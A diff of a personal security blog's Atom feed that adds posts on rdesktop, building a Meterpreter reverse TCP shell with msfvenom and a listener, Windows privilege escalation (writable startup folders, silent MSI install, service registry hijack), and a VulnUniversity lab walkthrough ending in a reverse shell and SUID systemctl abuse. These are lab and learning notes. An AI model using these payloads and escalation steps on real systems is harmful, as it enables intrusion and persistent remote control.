@@ -1,18 +1,226 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
   <title>CybSec</title>
-  <id>http://localhost:4000</id>
-  <link href="http://localhost:4000" />
-  <link href="http://localhost:4000/atom.xml" rel="self" />
-  <updated>2020-05-03T16:18:59+00:00</updated>
+  <id>http://localhost:8000</id>
+  <link href="http://localhost:8000" />
+  <link href="http://localhost:8000/atom.xml" rel="self" />
+  <updated>2020-05-23T14:55:46+00:00</updated>
   <rights>Copyright 2014, Undem</rights>
   <author>
     <name>Undem</name>
   </author>
   
     <entry>
+      <title>rdesktop</title>
+      <link href="http://localhost:8000/2020/05/23/rdesktop/" />
+      <summary type="html">&lt;p&gt;Rdesktop is an Unix client for connection to Windows Remote Desktop Services.
+Here is the command line to connect with a shared folder to exchange files:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;rdesktop &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;IP_address] &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; username_win_account &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; disk:share&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;path_to_your_folder/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+</summary>
+      <id>http://localhost:8000/2020/05/23/rdesktop/</id>
+      <updated>2020-05-23T10:00:00+00:00</updated>
+      <author>
+        <name>Undem</name>
+      </author>
+    </entry>
+  
+    <entry>
+      <title>Meterpreter</title>
+      <link href="http://localhost:8000/2020/05/23/meterpreter/" />
+      <summary type="html">&lt;h1 id=&quot;set-up-reverse-tcp-shell&quot;&gt;Set up reverse TCP shell&lt;/h1&gt;
+
+&lt;p&gt;To set up the reverse shell:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;You need to create your program which will be executed on the target&lt;/li&gt;
+  &lt;li&gt;You need to launch a listener, awaiting for the connection (from your program)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;To generate your program&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=[&lt;/span&gt;your IP] &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; exe|msi|... &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; name.exe|msi|...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;You need to specify your IP and not the target IP since your program will try to connect with your machine.&lt;/p&gt;
+
+&lt;p&gt;To launch the listener&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfconsole
+use multi/handler
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/meterpreter/reverse_tcp
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;lhost &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;your IP]
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;lport &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;default 4444] | &lt;span class=&quot;nb&quot;&gt;unset &lt;/span&gt;lport
+run&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Once the program is executed, you will see a session meterpreter.
+You can have multiple sessions:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; sessions &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ID_meterpreter_session &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;on msfconsole, not meterpreter session&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ sessions &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+</summary>
+      <id>http://localhost:8000/2020/05/23/meterpreter/</id>
+      <updated>2020-05-23T10:00:00+00:00</updated>
+      <author>
+        <name>Undem</name>
+      </author>
+    </entry>
+  
+    <entry>
+      <title>Windows PrivEsc</title>
+      <link href="http://localhost:8000/2020/05/23/windows-privesc/" />
+      <summary type="html">&lt;p&gt;Here some of classic examples of windows priv esc (from Windows PrivEsc Arena/TCM)&lt;/p&gt;
+
+&lt;h1 id=&quot;windows---accesschk&quot;&gt;Windows - Accesschk&lt;/h1&gt;
+&lt;p&gt;Accesschk is a useful console program for viewing the permissions on files, registry keys, services…
+By combining the option:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; : write access
+&lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; : supress errors
+&lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; : verbose&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;You can find directories in which you have write access with elevated privileges.&lt;/p&gt;
+
+&lt;h1 id=&quot;windows---autorun&quot;&gt;Windows - Autorun&lt;/h1&gt;
+&lt;p&gt;Autorun or Startup programs are services managed by the Service Manager&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;utorun Program&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;If the permission for Everyone is FILE_ALL_ACCESS, so you just need to drop your program and wait for the admin to log in.&lt;/p&gt;
+
+&lt;h1 id=&quot;windows---startup&quot;&gt;Windows - Startup&lt;/h1&gt;
+&lt;p&gt;This is the same thing as before, checking ACL permission:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;iacls.exe C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogramData&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;tart Menu&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rgrams&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;tartup&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;If the output is on full access (F) for BUILTIN\Users, then drop your program to do a reverse shell.
+The target need to be logon as Administrator for the privilege access.&lt;/p&gt;
+
+&lt;h1 id=&quot;windows---always-installed-elevated&quot;&gt;Windows - Always Installed Elevated&lt;/h1&gt;
+&lt;p&gt;One good way to know is the Installed Elevated feature is enable is to do:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/undem.github.io/assets/img/vulnuniversity/alwaysinstalled.png&quot; /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;HKLM: H_KEY_Local_Machine
+HKCU: H_KEY_Current_User&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It represents the configuration related to the local machine and to the current user.&lt;/p&gt;
+
+&lt;p&gt;So what you need to do is generate a msi package:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;lhost&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=[&lt;/span&gt;your ip] &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; msi &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; setup.msi&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And on the Windows machine execute it in background:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msiexec /quiet /qn /i C:&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;etup.msi
+/qn: no UI
+/i: normal installation
+/quiet: quiet mode &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no user interaction&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1 id=&quot;windows-registry&quot;&gt;Windows Registry&lt;/h1&gt;
+&lt;p&gt;In order to verify the fullControl privilege on the services, with powershell you can check:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Get-Acl &lt;span class=&quot;nt&quot;&gt;-Path&lt;/span&gt; HKLM:&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;urrentControlSet&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ervices&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;egsvc | fl&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Should display: NT AUTHORITY\INTERACTIVE
+That means you can create your custom service, replace the original one and execute it:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;reg add HKLM&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;YSTEM&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;urrentControlSet&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ervices&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;egsvc /v ImagePath /d c:&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ervice.exe /f
+/v ImagePath: path of the service &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;this is the value&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/d &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the data of the value
+/f  add the registry key without prompting &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;confirmation&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And then you can execute your service:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sc start regsvc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&quot;/undem.github.io/assets/img/vulnuniversity/services1.png&quot; /&gt;
+&lt;img src=&quot;/undem.github.io/assets/img/vulnuniversity/services2.png&quot; /&gt;&lt;/p&gt;
+</summary>
+      <id>http://localhost:8000/2020/05/23/windows-privesc/</id>
+      <updated>2020-05-23T10:00:00+00:00</updated>
+      <author>
+        <name>Undem</name>
+      </author>
+    </entry>
+  
+    <entry>
+      <title>VulnUniversity</title>
+      <link href="http://localhost:8000/2020/05/03/vulnuniversity/" />
+      <summary type="html">&lt;h1 id=&quot;nmap---first-step-scanning-the-host&quot;&gt;Nmap - First step scanning the host&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/undem.github.io/assets/img/vulnuniversity/nmap.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then we will use dirsearch to search for web directories&lt;/p&gt;
+
+&lt;h1 id=&quot;dirsearch---web-path-scanner&quot;&gt;Dirsearch - Web path scanner&lt;/h1&gt;
+
+&lt;p&gt;We found a directory named “internal”
+This is a web page to upload file but we don’t know the extension…&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/undem.github.io/assets/img/vulnuniversity/dirsearch.png&quot; /&gt;
+Let’s use Burp Intruder&lt;/p&gt;
+
+&lt;h1 id=&quot;burp-intruder---test-file-extensions&quot;&gt;Burp Intruder - Test file extensions&lt;/h1&gt;
+&lt;p&gt;We choose simple list and we upload a common list of extensions
+On positions, we choose the attack type: Sniper.
+When we are on the web page, we launch the Intruder option:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/undem.github.io/assets/img/vulnuniversity/burp_proxy.png&quot; /&gt;
+with the Forward button&lt;/p&gt;
+
+&lt;p&gt;And we get:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/undem.github.io/assets/img/vulnuniversity/burp_intruder.png&quot; /&gt;
+So we create a phtml reverse shell and we upload the file. At the same time, we use netcat
+to listen for the incoming connection:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/undem.github.io/assets/img/vulnuniversity/netcat.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;suid-permission&quot;&gt;SUID permission&lt;/h1&gt;
+
+&lt;p&gt;We search for Set-UID permission:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; /40000&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;(Btw SGID is 2000 and so SGID+SUID=6000)&lt;/p&gt;
+
+&lt;p&gt;We found the binary systemctl.
+The flag is at&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;  /root/flag.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;So we create a service which will display the content of the file.&lt;/p&gt;
+
+&lt;p&gt;But we don’t have the permission to create a file in the systemd directory. How to do it? Environment variable:&lt;/p&gt;
+
+&lt;h1 id=&quot;systemctl-link-feature&quot;&gt;Systemctl Link feature&lt;/h1&gt;
+&lt;p&gt;We save the service conf file in an environment variable.
+Systemctl has an interesting option:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;  systemctl &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;path_to_unit_file&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;You can link a unit file which will create a link in /etc/systemd/system.
+You just need to enable it and start it. By combining the option&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;  &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--now&lt;/span&gt;: When used with &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt;, the units will also be started&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And then we get the content of the file we want:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/undem.github.io/assets/img/vulnuniversity/systemctl.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hoped you liked this article!&lt;/p&gt;
+</summary>
+      <id>http://localhost:8000/2020/05/03/vulnuniversity/</id>
+      <updated>2020-05-03T16:57:51+00:00</updated>
+      <author>
+        <name>Undem</name>
+      </author>
+    </entry>
+  
+    <entry>
       <title>Nmap</title>
-      <link href="http://localhost:4000/2020/05/03/nmap/" />
+      <link href="http://localhost:8000/2020/05/03/nmap/" />
       <summary type="html">&lt;h1 id=&quot;nmap&quot;&gt;Nmap&lt;/h1&gt;
 &lt;p&gt;Scanning target is the easiest part&lt;/p&gt;
 
@@ -66,7 +274,7 @@ You can combine nmap output with Metasploit. If you are using Metasploit, you ca
 &lt;p&gt;Here is an example
 &lt;img src=&quot;/undem.github.io/assets/img/vulnuniversity/nmap.png&quot; /&gt;&lt;/p&gt;
 </summary>
-      <id>http://localhost:4000/2020/05/03/nmap/</id>
+      <id>http://localhost:8000/2020/05/03/nmap/</id>
       <updated>2020-05-03T10:00:00+00:00</updated>
       <author>
         <name>Undem</name>
